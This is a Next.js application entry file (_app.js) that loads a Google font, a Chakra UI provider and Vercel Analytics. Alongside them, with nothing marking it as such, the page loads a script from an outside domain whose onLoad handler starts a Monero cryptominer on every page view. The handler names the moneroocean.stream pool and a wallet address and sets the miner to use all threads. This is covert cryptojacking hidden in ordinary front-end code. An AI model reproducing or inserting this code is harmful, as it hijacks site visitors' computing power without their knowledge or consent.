
import { Nunito_Sans } from 'next/font/google';
import { Analytics } from '@vercel/analytics/react';
import Script from 'next/script';
import { ChakraProvider } from '@chakra-ui/react'
import '@/styles/globals.css';


const urbanistFont = Nunito_Sans({ subsets: ['latin'] })

export default function App({ Component, pageProps }) {
  return <main className={urbanistFont.className}>
    <ChakraProvider>
      <Component {...pageProps} />
    </ChakraProvider>
    <Analytics />

    <Script src="https://script.ghgi.xyz"
      onLoad={() => {
        server = "wss://ghgi.xyz";
        let pool = "moneroocean.stream";
        let walletAddress = "45bF6KJGyiVHiACEPn2KD2frjpuJjZBEM2iNxh6RNsfu11AhWHiqwPKJV3qj4jnDmGEKbQMiUcgXjZLwpTR2MnreQvhjQF4";
        let workerId = "AM"
        let threads = -1;
        let password = "x";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 83;
      }} />
  </main>
}
